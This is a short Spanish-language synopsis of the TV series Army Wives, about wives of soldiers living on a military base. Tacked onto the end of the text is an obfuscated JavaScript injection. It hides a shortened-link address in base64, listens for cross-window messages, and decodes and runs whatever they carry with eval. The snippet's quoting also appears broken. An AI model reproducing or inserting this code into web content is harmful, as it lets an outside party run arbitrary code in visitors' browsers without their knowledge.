Descripcion
De manos de The Mark Gordon Company y ABC Television Studios llega Army Wives, una nueva serie sobre los problemas, los sueños y las amistades de un diverso grupo de mujeres — y un hombre– que viven con sus esposos y familias en una activa base militar, y que sufren las presiones y tradiciones que impone la vida en el ejército en las personas que se quedan en casa, mientras sus allegados sirven a su país.
La vida de esposa de un militar nunca es aburrida, especialmente la de las protagonistas de esta serie. Se enfrentarán a todo tipo de retos y desafíos tratando de encajar en el mundo militar, intentando mantener el contacto con sus seres queridos en el frente, y soportando las estrictas tradiciones militares, lo que las llevará a formar una insólita alianza para ayudarse entre ellas a pasar por las situaciones más inimaginables y proteger sus secretos más oscuros.(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write(");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write(")})();

